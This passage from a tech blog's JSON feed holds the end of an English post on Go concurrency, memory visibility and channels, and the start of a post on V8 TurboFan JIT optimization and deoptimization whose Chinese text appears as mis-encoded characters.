punctuation\">(</span><span class=\"token punctuation\">)</span><br><br>\tflag <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><br><br>\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">{</span><br>\t\t<span class=\"token keyword\">continue</span><br>\t<span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>line 5~10 would never end.</p>\n<p>Then ordering. <a href=\"https://medium.com/r/?url=https%3A%2F%2Fgolang.org%2Fref%2Fmem\">The Official Goalng Blog</a> mentions that this code is non-concurrence safe:</p>\n<pre class=\"language-go\"><code class=\"language-go\"><span class=\"token keyword\">var</span> a<span class=\"token punctuation\">,</span> b <span class=\"token builtin\">int</span><br><br><span class=\"token keyword\">func</span> <span class=\"token function\">f</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\ta <span class=\"token operator\">=</span> <span class=\"token number\">1</span><br>\tb <span class=\"token operator\">=</span> <span class=\"token number\">2</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">func</span> <span class=\"token function\">g</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t<span class=\"token function\">print</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><br>\t<span class=\"token function\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t<span class=\"token keyword\">go</span> <span class=\"token function\">f</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>\t<span class=\"token function\">g</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>It may happen that g prints 2 and then 1. So we must protect that variable with something like Lock to protect it. But how come an effective Language like Golang would handle this issue in such a heavy way?</p>\n<p>Look at this Golangâ€™s official blog, we can see how to solve the issue in Golang way. The blog mentions that:</p>\n<blockquote>\n<p>Do not communicate by sharing memory; instead, share memory by communicating.</p>\n</blockquote>\n<p>Thatâ€™s the way Golang encourages you to do: using <a href=\"https://en.wikipedia.org/wiki/Communicating_sequential_processes\">CSP model</a>. So I think the key way to solve the shared variable in concurrency in Golang is â€œNOT TO SHARE ITâ€. Instead, you should use chan to communicate. And as mentioned above, chan DO guarantee happen-before!</p>\n<p>According to discuss above, I think it should pass flag through chan in the visibility example:</p>\n<pre class=\"language-go\"><code class=\"language-go\"><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br><br>\tdone <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">chan</span> <span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span><br><br>\t<span class=\"token keyword\">go</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span>done <span class=\"token operator\">&lt;-</span><span class=\"token keyword\">chan</span> <span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t\tflag <span class=\"token operator\">:=</span> <span class=\"token boolean\">true</span><br>\t\t<span class=\"token keyword\">for</span> flag <span class=\"token punctuation\">{</span><br>\t\t\t<span class=\"token keyword\">select</span> <span class=\"token punctuation\">{</span><br>\t\t\t<span class=\"token keyword\">case</span> flag <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;-</span>done<span class=\"token punctuation\">:</span><br>\t\t\t\t<span class=\"token keyword\">break</span><br>\t\t\t<span class=\"token punctuation\">}</span><br>\t\t<span class=\"token punctuation\">}</span><br>\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"End of goroutine\\n\"</span><span class=\"token punctuation\">)</span><br><br>\t<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span>done<span class=\"token punctuation\">)</span><br><br>\tdone <span class=\"token operator\">&lt;-</span> <span class=\"token boolean\">false</span><br>\t<span class=\"token function\">close</span><span class=\"token punctuation\">(</span>done<span class=\"token punctuation\">)</span><br><br>\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">{</span><br>\t\t<span class=\"token keyword\">continue</span><br>\t<span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>Also, I think it should pass a and b through chan in the ordering example, the code may look like:</p>\n<pre class=\"language-go\"><code class=\"language-go\"><span class=\"token keyword\">var</span> a<span class=\"token punctuation\">,</span> b <span class=\"token builtin\">int</span><br><br><span class=\"token keyword\">func</span> <span class=\"token function\">f</span><span class=\"token punctuation\">(</span>done <span class=\"token operator\">&lt;-</span><span class=\"token keyword\">chan</span> <span class=\"token keyword\">interface</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">&lt;-</span><span class=\"token keyword\">chan</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&lt;-</span><span class=\"token keyword\">chan</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\tchana <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">chan</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span><br>\tchanb <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">chan</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span><br>\t<span class=\"token keyword\">go</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t\t<span class=\"token keyword\">defer</span> <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>chana<span class=\"token punctuation\">)</span><br>\t\t<span class=\"token keyword\">defer</span> <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>chanb<span class=\"token punctuation\">)</span><br><br>\t\tchana <span class=\"token operator\">&lt;-</span> <span class=\"token number\">1</span><br>\t\tchanb <span class=\"token operator\">&lt;-</span> <span class=\"token number\">2</span><br>\t\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">{</span><br>\t\t\t<span class=\"token keyword\">select</span> <span class=\"token punctuation\">{</span><br>\t\t\t<span class=\"token keyword\">case</span> <span class=\"token operator\">&lt;-</span>done<span class=\"token punctuation\">:</span><br>\t\t\t\t<span class=\"token keyword\">return</span><br>\t\t\t<span class=\"token punctuation\">}</span><br>\t\t<span class=\"token punctuation\">}</span><br>\t<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br><br>\t<span class=\"token keyword\">return</span> chana<span class=\"token punctuation\">,</span> chanb<br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">func</span> <span class=\"token function\">g</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t<span class=\"token function\">print</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><br>\t<span class=\"token function\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\tdone <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">chan</span> <span class=\"token keyword\">interface</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><br>\t<span class=\"token keyword\">defer</span> <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>done<span class=\"token punctuation\">)</span><br><br>\tchana<span class=\"token punctuation\">,</span> chanb <span class=\"token operator\">:=</span> <span class=\"token function\">f</span><span class=\"token punctuation\">(</span>done<span class=\"token punctuation\">)</span><br>\ta <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;-</span>chana<br>\tb <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;-</span>chanb<br>\t<span class=\"token function\">g</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span></code></pre>\n<h3 id=\"conclusion\"><a class=\"direct-link\" href=\"#conclusion\">#</a> Conclusion</h3>\n<p>The most difficult part of writing concurrency code is that most of the bug is not determined, uncertain, and can not reproduce easily, thus itâ€™s had to debug.</p>\n<p>Thatâ€™s why we should dig deeper into detail in how a program langue handle concurrency, understand how your code would run in your machine and prevent you from doing thing wrong.</p>\n",
      "date_published": "2021-05-03T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/maxchiu/turbofan/",
      "url": "https://tech-blog.cymetrics.io/posts/maxchiu/turbofan/",
      "title": "å¾ç·¨è­¯å™¨å„ªåŒ–è§’åº¦åˆæ¢ Javascriptçš„V8 å¼•æ“",
      "content_html": "<p><img src=\"/img/posts/max/DiveIntoTurbofan/1__NyZv46I1bYz4K7ngiT__W9Q.jpeg\" alt=\"\"></p>\n<!-- summary -->\n<p>é€™ç¯‡æ–‡ç« æƒ³ä»¥V8å¼•æ“å°æ–¼JSçš„å¯¦ç¾ç‚ºä¾‹ä¾†æ¢è¨ç·¨è­¯å™¨å„ªåŒ–çš„ä¸€äº›åŸºç¤è­°é¡Œä¸¦æ­é…å¯¦é©—ï¼Œå¸Œæœ›èƒ½è®“è®€è€…å°æ–¼è¡€æ±—çš„ç·¨è­¯å™¨åˆ°åº•åœ¨èƒŒå¾Œå¹«æˆ‘å€‘å®Œæˆäº†å¤šå°‘äº‹æƒ…æœ‰é»æ¦‚å¿µã€‚</p>\n<!-- summary -->\n<p>ä¸€èˆ¬äººå°æ–¼ JS é€™ç¨® Scripting Language çš„å°è±¡å¤§æ¦‚å°±æ˜¯ç›¸æ¯”æ–¼ C++ ä¹‹é¡ç›´æ¥ç·¨è­¯æˆå°æ‡‰æŒ‡ä»¤é›†çš„èªè¨€ï¼Œå› ç‚ºæ˜¯æŠŠ Source code è—‰ç”± Interpreter ç·¨è­¯æˆ è·‘åœ¨åŸç”Ÿç’°å¢ƒçš„ <a href=\"https://en.wikipedia.org/wiki/Virtual_machine\">Process VM</a> ä¸Šå°æ‡‰çš„ Bytecodeï¼Œæ²’è¾¦æ³•ç›´æ¥åœ¨ Machine code å±¤ç´šåšå„ªåŒ–ï¼Œæ‰€ä»¥é€Ÿåº¦é€šå¸¸æœƒæ…¢äº†ä¸€æˆªã€‚</p>\n<p><img src=\"/img/posts/max/DiveIntoTurbofan/0__6JLpKVtBq4eIEljk.png\" alt=\"\"></p>\n<p>é›–ç„¶ Bytecode é€™ç¨®åšæ³•åœ¨åŸ·è¡Œæ™‚æœŸé€Ÿåº¦é¡¯ç„¶æœƒè¼ƒæ…¢ï¼Œä½†æŠŠ Source code ç·¨è­¯æˆ Bytecode å½¢å¼ï¼Œä¸åƒ…åƒ…æ˜¯å…·å‚™äº†â€œç·¨è­¯ä¸€æ¬¡ï¼Œå„å¹³å°é€šç”¨â€çš„è·¨å¹³å°çš„ç‰¹æ€§ï¼ŒåŒæ™‚ Bytecode çš„æŒ‡ä»¤å±¤ç´šä¹Ÿå› ç‚ºæ¯”è¼ƒ High levelï¼Œ ç›¸æ¯”æ–¼ç²¾ç¢ºç¹ç‘£çš„ Machine å±¤ç´šæŒ‡ä»¤ï¼Œç·¨è­¯ Bytecode çš„é€Ÿåº¦é€šå¸¸æœƒå¿«å‡ºè¨±å¤šã€‚</p>\n<p><img src=\"/img/posts/max/DiveIntoTurbofan/0__FK2W6kz9__36yXHnm.png\" alt=\"\"><br>\n<img src=\"/img/posts/max/DiveIntoTurbofan/0__pq5o__C__DCDLht__XB.png\" alt=\"\"></p>\n<p>ä»¥ä¸Šåœ–ç‚ºä¾‹ï¼Œä¸€å€‹ result = 1 + obj.x é€™æ¨£çš„ source codeï¼Œéš¨è‘—æŒ‡ä»¤å±¤ç´šçš„è¶Šä½ï¼Œç·¨è­¯çš„è¤‡é›œåº¦å’Œæ™‚é–“ä¹Ÿæœƒéš¨ä¹‹æå‡ã€‚ç„¶è€Œè¶Šç²¾ç¢ºçš„æŒ‡ä»¤å° CPU ä¾†èªªæ‰å¯ä»¥ç™¼æ®æœ€é«˜çš„ç¡¬é«”æ•ˆèƒ½ã€‚ æ‰€ä»¥å…¶å¯¦è¦æŠŠ Source code æŠ½è±¡åˆ°æ€æ¨£çš„å±¤ç´šå°±æ˜¯è¨­è¨ˆç·¨è­¯å™¨æ™‚ä¸€å€‹å¾ˆé‡è¦çš„ Issueã€‚</p>\n<p>è€Œè¨±å¤šåŸºæ–¼ Bytecode çš„èªè¨€ç‚ºäº†èƒ½å¤ æå‡æ•ˆç‡ï¼Œå¼•å…¥äº†æ‰€è¬‚çš„ <a href=\"https://zh.wikipedia.org/wiki/%E5%8D%B3%E6%99%82%E7%B7%A8%E8%AD%AF\">JIT</a> æŠ€è¡“ï¼Œé€éåœ¨åŸ·è¡Œæ™‚æœŸåˆ†æå¸¸è¢«åŸ·è¡Œçš„ç‰‡æ®µï¼ŒåŒæ­¥åœ°æŠŠé€™äº›ç‰‡æ®µçš„ profileing data åœ¨èƒŒå¾Œå·å·é¤µé€² optimizing compiler ï¼Œç·¨è­¯æˆ Machine code å¾Œå·å·çš„æ›¿æ›æ‰åŸæœ¬ bytecode ä»¥æå‡é‹è¡Œçš„é€Ÿåº¦ã€‚ï¼ˆå¯ä»¥æ˜¯å¾ <a href=\"https://www.google.com/search?q=abstract+syntax+tree&amp;sxsrf=ALeKk02ELy_J6aRB-LjA0fdC8u6fBk-ITA%3A1617433965743&amp;ei=bRVoYNz1LIOmmAXr6LfwBg&amp;oq=abstract+syn&amp;gs_lcp=Cgdnd3Mtd2l6EAEYADICCAAyAggAMgIIADICCAAyBQgAEMsBMgUIABDLATIFCAAQywEyBQgAEMsBMgUIABDLATIFCAAQywE6BAgjECc6BAgAEEM6BQgAELEDOggIABCxAxCDAToHCAAQsQMQQzoKCAAQsQMQRhD_AVDY_QhYtZAJYL2bCWgDcAB4AIABQIgBhQWSAQIxM5gBAKABAaoBB2d3cy13aXrAAQE&amp;sclient=gws-wiz\">AST</a> ä¹Ÿå¯ä»¥æ˜¯å¾ Bytecode å„ªåŒ–ï¼‰[2]</p>\n<p>V8 å¼•æ“ç›®å‰æ‰€ä½¿ç”¨çš„ Optimizing Compilerå«åš <a href=\"https://v8.dev/\">TurboFan</a> ï¼Œ ä»–ä½¿ç”¨äº†ä¸€å¥—è‡ªè¨‚çš„ IR [3] ï¼Œä¸¦ç”¨ Sea Of Nodes å–ä»£å‚³çµ±ç·¨è­¯å™¨å„ªåŒ–ä¸­ä½¿ç”¨çš„ CFGï¼Œå¤§å¹…æå‡äº†å„ªåŒ–ç­–ç•¥çš„å½ˆæ€§ï¼Œä¸¦å¯¦ç¾äº†å¤§éƒ¨åˆ†èªè¨€éƒ½æœ‰çš„å…±é€šå„ªåŒ–æ–¹å¼ï¼ˆ Inliningã€Loop Splitting ã€ Escape AnalysisÂ â€¦ etc )ã€‚(<strong>ï¼Šè¨»ä¸€)</strong></p>\n<p>å…·é«”ä¾†èªªï¼Œ Turbofan æ¡ç”¨çš„æ˜¯æ‰€è¬‚çš„æ¨æ¸¬å¼å„ªåŒ–ï¼ˆ Speculative Optimization ï¼‰ã€‚å‹•æ…‹èªè¨€å› ç‚ºå…è¨±ä¸æŒ‡åè®Šæ•¸å‹åˆ¥ï¼ŒåŸ·è¡ŒæœŸçš„ Machine æŒ‡ä»¤ç†ç•¶æ˜¯ç„¡æ³•ç¢ºå®šï¼ˆèˆ‰æœ€ç°¡å–®çš„ä¾‹å­ ï¼Œâ€œï¼‹â€é€™å€‹ operator åœ¨ String è·Ÿ Number è¡Œç‚ºå®Œå…¨ä¸ä¸€æ¨£ï¼‰ï¼Œä½† Turbofan æ ¹æ“š Runtime æ™‚çš„ Profiling è³‡è¨Šï¼Œâ€œæ¨æ¸¬â€ ä¸€äº›é€™æ®µ Source Code ç¢ºåˆ‡çš„å‹åˆ¥ã€‚ä»¥å‡½å¼å‘¼å«ä¾†èªªï¼Œ Turbofanæœƒåœ¨åŸ·è¡ŒæœŸçš„æ¯å€‹ Functionçš„Code Objectè£¡é¢éƒ½é¡å¤–å¸¶ä¸Šæ‰€è¬‚çš„ <strong>Feedback Vector[4]</strong> ï¼Œç”¨ä¾†çµ±è¨ˆä¸€å€‹å‡½å¼çš„åŸ·è¡Œç‹€æ³ã€‚</p>\n<p><img src=\"/img/posts/max/DiveIntoTurbofan/0____DVw6OQA0S5z1Ryu.png\" alt=\"\"></p>\n<p>æˆ‘å€‘è€ƒæ…®ä¸€å€‹ç°¡å–®çš„ç‹€æ³</p>\n<p><img src=\"/img/posts/max/DiveIntoTurbofan/0__ec5paOPfU9S1XkoU.png\" alt=\"\"></p>\n<p>é€™æ¨£çš„è©±å‡½å¼ç‚ºä¾‹ï¼Œè‹¥åŸ·è¡ŒæœŸæ•¸åæ¬¡å°é€™å€‹å‡½å¼çš„å‘¼å«å‚³å…¥çš„éƒ½æ˜¯Integerï¼Œé‚£éº¼ Feedback Vector å°±æœƒé–‹å§‹çµ±è¨ˆé€™äº›è³‡è¨Šï¼ŒTurbofan æœƒé–‹å§‹åœ¨èƒŒå¾ŒåŒæ­¥åœ°æŠŠ Add( x, y)çš„ Bytecode è½‰æ›æˆé‡å° Integer æ“ä½œçš„æŒ‡ä»¤ã€‚</p>\n<p>ç„¶è€Œæ¨æ¸¬æ€§çš„å„ªåŒ–çµ‚ç©¶åªæ˜¯æ¨æ¸¬æ€§çš„ï¼Œéäº†ä¸€é™£å­å¦‚æœUserçªç„¶å° Add å‡½å¼å‚³é€²äº†ä¸€å€‹ Stringï¼ŒV8å¼•æ“æ˜¯ä¸æ˜¯å°±è¦çˆ†æ‰äº†ï¼Ÿç•¢ç«Ÿé€£ Machine code éƒ½å·²ç¶“æŠŠå®ƒç•¶æˆ Integer ä¾†æ“ä½œäº†ï¼Œé›£é“è¦å™´ Segmentation Faultäº†ï¼Ÿ</p>\n<p>å¯¦éš›ä¸Š TurboFan åœ¨è™•ç† JIT å„ªåŒ–æ™‚ï¼Œä¸¦ä¸åªæ˜¯å–®ç´”çš„æŠŠå°æ‡‰çš„ code è½‰æˆ machine code ï¼Œ è€Œæ˜¯æœƒåŒæ™‚åœ¨ Code ä¸­å¡å…¥æ‰€è¬‚çš„ Checkpointï¼ŒåŸ·è¡Œå„ªåŒ–éçš„ Machine code å‡½å¼ ä¹‹å‰ï¼Œæœƒå…ˆæª¢æŸ¥å‚³å…¥çš„åƒæ•¸æ˜¯å¦è·Ÿå…ˆå‰çš„å‡è¨­ä¸€è‡´ï¼Œè‹¥å‡è¨­ä¸æˆç«‹äº†ï¼Œå‰‡é€²è¡Œ Deoptimizationã€‚<br>\nï¼ˆé€™é‚Šæœ‰å€‹é»è¦æé†’ï¼Œè‹¥ åŒä¸€æ®µ code Optimization-Deoptimization é€™æ¨£å­çš„é‡è¤‡äº†äº”æ¬¡ä»¥ä¸Šï¼Œåœ¨ Turbofan å°±æœƒèªå®šé€™æ˜¯æ®µ Megamorphic çš„ Codeï¼Œä¸¦æ”¾æ£„å°ä»–é€²è¡Œ JIT å„ªåŒ–ï¼‰[7]</p>\n<p><img src=\"/img/posts/max/DiveIntoTurbofan/0__cSphl2MMRjAZlmi3.png\" alt=\"\"></p>\n<p>å¾ä¸Šåœ–å¯ä»¥çœ‹åˆ°ï¼Œå„ªåŒ–éçš„æ©Ÿå™¨ç¢¼ä¸­ï¼Œå¯¦éš›çš„å‡½æ•¸å…§æŒ‡ä»¤æ˜¯é»ƒè‰²çš„éƒ¨åˆ†ï¼Œè—è‰²éƒ¨åˆ†æª¢æŸ¥åƒæ•¸æ˜¯å¦ç‚º Small Integer å‹åˆ¥ï¼Œæ©˜è‰²éƒ¨åˆ†æª¢æŸ¥ object çš„ Hidden Class (ï¼Šè¨»äºŒï¼‰æ˜¯å¦ç›¸åŒã€‚ è‹¥ä¸ç›¸åŒå°±ç›´æ¥ Jump åˆ°å°æ‡‰çš„è™•ç†ç¨‹å¼ç¢¼ã€‚</p>\n<p>å…·é«”ä¾†èªªï¼Œ ç‚ºäº†èƒ½é †åˆ© fallback å›å»ç”¨ Bytecode åŸ·è¡Œï¼ŒDeoptimization è¦åšä»¥ä¸‹å¹¾ä»¶äº‹ï¼š</p>\n<ul>\n<li>æŠŠç›®å‰ memory stack ä¸­çš„ frame å’Œ Register ä¸­çš„è³‡è¨Šå­˜é€² buffer</li>\n<li>å¾ (optimized) frame ä¸­é‡æ§‹å‡º interpreter çš„ frameï¼Œè‹¥å„ªåŒ–å¾Œçš„ frame æ˜¯ inlined çš„ï¼Œå‰‡å¿…é ˆä¾åºå»ºæ§‹å‡ºæ­£ç¢ºçš„ function stack (ç•¢ç«Ÿ interpreter æ˜¯æ²’æœ‰è¾¦æ³•åš inlining å„ªåŒ–çš„å•Šå•Šï¼‰</li>\n<li>æŠŠ Register çš„å€¼è®€é€²æ–°çš„ stack éœ€è¦çš„ä½ç½® ï¼ˆæœ‰æ²’æœ‰æ„Ÿè¦ºè·Ÿ Context Switch åœ¨åšçš„äº‹æœ‰é»åƒXD)</li>\n<li>é‡æ–° Materialize é‚£äº›è¢« Turbofan ç”¨ <a href=\"https://en.wikipedia.org/wiki/Escape_analysis\">Escape Analysis</a> å„ªåŒ–çœç•¥æ‰çš„ç‰©ä»¶å¯¦ä¾‹</li>\n<li>æŠŠ Program counter è·³å›å»çµ¦ Interpreter</li>\n</ul>\n<p>ä»¥ä¸Šé€™å°±æ˜¯ V8å¼•æ“ä¸­æ‰€è¬‚çš„ Eager Deoptimizationã€‚</p>\n<p>ä¸¦ä¸”ï¼Œè‹¥æŸå€‹è®Šæ•¸çš„ CheckPoint Failäº†ï¼Œæ‰€æœ‰å…¶ä»–æœƒä½¿ç”¨åˆ°åŒä¸€å€‹è®Šæ•¸çš„å‡½å¼ä¹Ÿè¦ Deoptimizeã€‚ç„¶è€Œå¯¦éš›ä¸Šé€™äº›ç›¸ä¾çš„å‡½å¼å› ç‚ºä¸æ˜¯åœ¨ Stack çš„é ‚ç«¯ï¼Œä¸èƒ½ç›´æ¥ Deoptimize ( ä¾‹å¦‚ç„¡æ³•å–å¾— register çš„ snapshot )</p>\n<p><img src=\"/img/posts/max/DiveIntoTurbofan/0__WTJD__3E4soas9mJh.png\" alt=\"\"></p>\n<p>æ‰€ä»¥å¯¦å‹™ä¸Š Turbofan é‚„æœ‰ä¸€æ‹›æ‰€è¬‚çš„ Lazy Deoptimizationã€‚ åœ¨ä¸€é–‹å§‹ç·¨è­¯ Machine Code æ™‚å°±æœƒè¨»å†Šå‡½å¼å’Œè®Šæ•¸ä¹‹é–“çš„ Dependencyï¼Œ è€Œè‹¥æŸä¸€æ®µcode æ”¹åˆ°äº†æŸå€‹è®Šæ•¸çš„ Shapeï¼Œæœƒåœ¨ç›¸ä¾çš„å‡½æ•¸ä¸­æŠŠåŸæœ¬è¦å­˜å–æ­¤è®Šæ•¸çš„ code å€æ®µå…ˆç”¨ä¸€æ®µ Patched instruction æ›¿ä»£ã€‚é€™å€‹ instruction çš„åŠŸç”¨å°±æ˜¯å»å‘¼å«Deoptimizerã€‚é€™æ¨£å­æˆ‘å€‘å°±å¯ä»¥åœ¨åŸ·è¡Œåˆ°æœƒå‡ºå•é¡Œçš„ç‰‡æ®µæ™‚å†å» Deoptimizeäº†ï¼</p>\n<p><img src=\"/img/posts/max/DiveIntoTurbofan/0______KJ__E7A8zUnQ2BP.png\" alt=\"\"></p>\n<p>ä»¥ä¸Šå°±æ˜¯æˆ‘å€‘å‰å¤§çš„ Turbofan å¤§å¤§åœ¨æˆ‘å€‘è·‘ JS Code æ™‚ä¸€ç›´å‹å¿ƒå‹åŠ›åœ¨åšçš„äº‹æƒ…ã€‚è¬›äº†é€™éº¼å¤šç†è«–ä¸Šçš„æ±è¥¿æˆ‘æƒ³å¤§å®¶å¯èƒ½é‚„æ˜¯æœ‰é»èŒ«ç„¶ï¼Œä»¥ä¸‹å°±ç”¨å¹¾å€‹ç°¡å–®çš„å¯¦é©—ä¾†æ¢è¨ä¸€äº› Turbofan å¹«æˆ‘å€‘åšçš„äº‹æƒ…ã€‚</p>\n<p>è®“æˆ‘å€‘è€ƒæ…®ä»¥ä¸‹é€™å€‹ç°¡å–®çš„ç¨‹å¼ç‰‡æ®µ test.js</p>\n<p><img src=\"/img/posts/max/DiveIntoTurbofan/0__tzW02alSCz__NNYJD.png\" alt=\"\"></p>\n<p>æˆ‘å€‘åœ¨ node ç’°å¢ƒä¸‹åŸ·è¡Œ <strong>nodeâ€Šâ€”â€Štrace-optâ€Šâ€”â€Štrace-deopt test.js | grep doSomething ï¼Œè—‰ç”±â€Šâ€”â€Štrace-opt å’Œâ€Šâ€”â€Štract-deoptè§€</strong>å¯Ÿ V8 åœ¨åŸ·è¡Œæ™‚å‹•æ…‹å„ªåŒ–å’Œåå„ªåŒ–æ™‚çš„è¡Œç‚º**ï¼Œ**ä¸¦ç”¨ <strong>perf_hook</strong> ç´€éŒ„åŸ·è¡Œæ™‚é–“ <strong>ã€‚</strong></p>\n<p><img src=\"/img/posts/max/DiveIntoTurbofan/0__ysU6PBHyDXMgEG4c.png\" alt=\"\"><br>\n<img src=\"/img/posts/max/DiveIntoTurbofan/0__Uk6z7x4EsoOieT2J.png\" alt=\"\"></p>\n<p>å¯ä»¥çœ‹åˆ° Turbofan ç¢ºå¯¦åœ¨åŸ·è¡ŒæœŸé–“å‹•æ…‹çš„å»å„ªåŒ–äº† doSomethingã€‚ è¢« markèµ·ä¾†çš„ reasonæ˜¯ <strong>small function</strong>ï¼Œä¹Ÿå°±æ˜¯èªª Turbofan è¦ºå¾—å¯ä»¥é€²è¡Œ inliningçš„å„ªåŒ–ã€‚</p>\n<blockquote>\n<p><em>Inlining ä»£è¡¨çš„æ˜¯ å‡è£å‡½å¼è£¡é¢çš„ code åƒæ˜¯ç›´æ¥åœ¨ caller å°å‡½å¼çš„å‘¼å«è™•å±•é–‹ã€‚é€™æ¨£çš„åšæ³•å¯ä»¥çœç•¥å‰µå»ºè·Ÿç¶­è­·æ–°çš„ stack frame æ‰€éœ€çš„æ™‚é–“ã€‚ TurboFan ä¸­å°æ–¼ä¸€å€‹å‡½å¼æ˜¯å¦å¯ä»¥é€²è¡Œ Inlining çš„æ¨™æº–å¯ä»¥åƒè€ƒ [9].</em></p>\n</blockquote>\n<p><img src=\"/img/posts/max/DiveIntoTurbofan/1__dBY1pw8ZHWqe__I__SfLGPyw.png\" alt=\"\"></p>\n<blockquote>\n<p><em>ç°¡å–®ä¾†èªªï¼Œå¦‚æœå‡½å¼åœ¨ AST ä¸­çš„ Node æ•¸å°‘æ–¼ 200ï¼Œä¸”å‡½å¼çš„ callstack æ·±åº¦å°æ–¼ 5ï¼Œå°±æ˜¯ä¸€å€‹åˆæ ¼çš„ Candidateã€‚<br>\nä½†ç¨‹å¼ä¸­å¯èƒ½æœƒæœ‰å¤§é‡çš„ Candidateï¼Œå¦‚æœå…¨éƒ¨éƒ½å±•é–‹å¯èƒ½éåº¦æ¶ˆè€—è³‡æºï¼Œæ‰€ä»¥ Turbofan æœƒè€ƒé‡å‡½å¼çš„ Relative Call Frequencyã€‚ä¹Ÿå°±æ˜¯èªªï¼Œå¾ callstack æœ€ä¸‹é¢çš„å‡½å¼çš„åŸ·è¡Œæ¬¡æ•¸é–‹å§‹ï¼Œä¾åºä¹˜ä¸Šæ¯å€‹å‡½æ•¸åœ¨çˆ¶å‡½æ•¸æ¯æ¬¡åŸ·è¡Œæ™‚è¢«åŸ·è¡Œåˆ°çš„æ¯”ä¾‹ï¼ˆè€Œéç›´æ¥çœ‹å‡½å¼è¢«åŸ·è¡Œçš„çµ•å°æ¬¡æ•¸ï¼‰ã€‚ æ­¤å€¼è¶Šé«˜çš„å‡½å¼æœƒè¶Šå„ªå…ˆè¢« Inliningã€‚</em></p>\n</blockquote>\n<p><img src=\"/img/posts/max/DiveIntoTurbofan/1__Tll__Gz2BbaIIYreX4s0H1g.png\" alt=\"\"></p>\n<blockquote>\n<p><em>å¦å¤–å¦‚æœæˆ‘å€‘åœ¨ä¸Šé¢çš„åŸ·è¡Œä¸­æŠŠâ€Šâ€”â€Šno-turbo-inlining flag æ‰“é–‹ä¾†ï¼Œå¯ä»¥çœ‹åˆ°æ•ˆèƒ½ä¹Ÿæœ‰æ˜é¡¯çš„ä¸‹é™</em></p>\n</blockquote>\n<p>æ¥è‘—æˆ‘å€‘æŠŠä¸Šé¢çš„ code çš„ç¬¬äºŒå€‹è¿´åœˆçš„å‹åˆ¥æ”¹æˆ Stringã€‚å†é‡æ–°åŸ·è¡Œä¸€æ¬¡ã€‚</p>\n<p><img src=\"/img/posts/max/DiveIntoTurbofan/0__aD0KzOXJwDqy__rXO.png\" alt=\"\"><br>\n<img src=\"/img/posts/max/DiveIntoTurbofan/0__Akv2Bje8G0v9ilEw.png\" alt=\"\"></p>\n<p>å¾ä¸Šé¢é€™æ®µ trace å¯ä»¥çœ‹å‡ºä¾†ï¼Œ Turbofan å° doSomething ä¸€æ¨£å…ˆåšäº†å„ªåŒ–ï¼Œæ¥è‘—å› ç‚ºåƒæ•¸å‹åˆ¥ä¸ä¸€è‡´è€Œé€²è¡Œäº† Eager 